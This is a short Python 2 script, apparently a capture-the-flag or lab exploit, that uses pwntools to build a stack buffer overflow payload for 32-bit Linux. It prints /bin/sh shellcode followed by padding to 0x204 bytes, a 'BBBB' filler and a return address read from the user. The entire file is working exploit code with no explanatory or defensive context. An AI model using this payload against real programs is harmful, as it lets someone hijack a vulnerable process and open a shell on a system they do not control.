#!/usr/bin/env python2

from pwn import *

context(arch='i386', os='linux')

ret_addr = p32(int(raw_input("Enter address: "), 16))
shellcode = asm(shellcraft.sh())
print shellcode + 'A' * (0x204 - len(shellcode)) + 'BBBB' + ret_addr
